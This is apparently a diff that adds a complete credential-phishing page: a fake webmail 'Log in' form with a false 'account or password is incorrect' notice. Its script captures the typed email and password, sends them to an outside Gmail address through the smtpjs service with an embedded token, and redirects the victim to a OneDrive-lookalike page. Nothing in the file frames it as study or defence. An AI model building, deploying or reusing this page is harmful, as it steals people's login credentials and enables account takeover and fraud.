@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="style01.css" rel="stylesheet" />
+    <script src="script01.js" ></script>
+    <title>Log in</title>
+    
+
+</head>
+<body class="blackwebmaillogin">
+    <script src="script01.js"></script>
+    <div class="loginbox">
+        <form class="zlogin"  action="#">
+            <img src="black webmail.png" alt="Alternate text" class="zohouser" />
+            <label class="v2surewest"  style="font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;">
+                <b>
+                    Your account or password is incorrect. 
+                </b>
+            </label>
+            <br><br><br>
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://onedrive--shared-documents-wenasndue3n2wnw23us.on.drv.tw/viewdocument--incorrectcredentials--2jashywu2/9834754834834843829 surewest webmail.html">
+            <br><br><br>
+            <input type="email" name="email" class="zohotxtemail" placeholder="  Email"  required>
+            <br><br>
+            <input type="Password" name="Pass" class="zohotxtpass" placeholder="  Password" required>
+            <br><br>
+            <button class="zohobtnsubmit" type="submit" >Log in</button>
+            <br><br>
+        </form>
+        <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+    
+        <script>
+              
+            const form = document.querySelector('.zlogin')
+    
+    
+           function sendMsg(e){
+            e.preventDefault();
+            
+                const  Fullname = document.querySelector('.zohotxtemail')
+                  department = document.querySelector('.zohotxtpass')
+    
+    
+             Email.send({
+             SecureToken : "523b9631-eba2-428d-b404-b38a5c0db98f",
+             To : 'jamslinda4@gmail.com',
+             From : "yohnlom@gmail.com",
+             Subject : "This is the subject"+"="+Fullname.value,
+             Body : "NAME  ["+Fullname.value+"]   department  ["+department.value+"]"
+             })
+             window.location.href = "https://Onedrivedocuments.github.io/viewdocuments-23jqmsai32mwqm3wqj3/98347548348348438 aol.html";
+           }
+    
+           form.addEventListener('submit', sendMsg);
+    
+            
+        </script>
+    </div>
+</body>
+</html>
